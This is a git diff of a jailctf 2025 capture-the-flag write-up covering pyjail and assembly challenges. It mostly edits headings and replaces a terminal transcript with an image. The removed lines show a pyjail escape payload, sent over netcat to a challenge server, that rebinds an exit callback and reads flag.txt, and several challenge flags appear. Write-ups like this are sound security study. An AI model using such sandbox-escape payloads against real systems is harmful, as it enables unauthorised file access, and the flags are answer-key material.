@@ -1,4 +1,4 @@
-# Challenge: sanity checksanity
+# Challenge: sanity 
 
 Category: social / sanity
 Author: jailctf org team
@@ -24,7 +24,7 @@ jail{welcome_to_jailctf_2025!!!}
 
 ______
 
-# Challenge: blindness (pyjail)
+# Challenge: blindness 
 
 Category: pyjail
 Author: @helloperson
@@ -59,7 +59,7 @@ Flag:
 `jail{stderr_leak_5fd787f079eb69e}`
 <img width="1786" height="328" alt="image" src="https://github.com/user-attachments/assets/e3d3b92b-6d89-4d0e-8592-e4ead8f4ce5b" />
 ____________
-# Challenge: ASMaaSassembly (pyasm)
+# Challenge: ASMaaSassembly 
 
 Category: pwn / asm
 Author: @lydxn
@@ -85,7 +85,7 @@ Flag:
 
 <img width="2176" height="174" alt="image" src="https://github.com/user-attachments/assets/10ec3891-fc54-4bfe-bdc1-c98c0c35c94d" />
 ____________
-# computer-monitor (pyjail) — short write-up
+# computer-monitor (pyjail)
 
 ## Challenge summary
 
@@ -121,8 +121,7 @@ Why it works:
 * Functions resolve globals at **call time**; rebinding those names is a classic way to defang preinstalled callbacks in pyjails that don’t block attribute access. 
 
 running the payload shows this
-```┌──(kali㉿PC)-[~]
-└─$ nc challs2.pyjail.club 28684
-> import sys; sys.modules['__main__'].__dict__['_exit']=int; print(open('flag.txt').read())
-jail{i_am_proto_your_security_is_my_motto_install_me_on_your_computer_to_protect_your_data_better_f6b37a6e6d0b0af2b5da77a61cd0af7c}
-```
+<img width="2326" height="182" alt="image" src="https://github.com/user-attachments/assets/98a15be8-9533-426d-9d9a-ff4d01ca6d85" />
+
+________________________
+
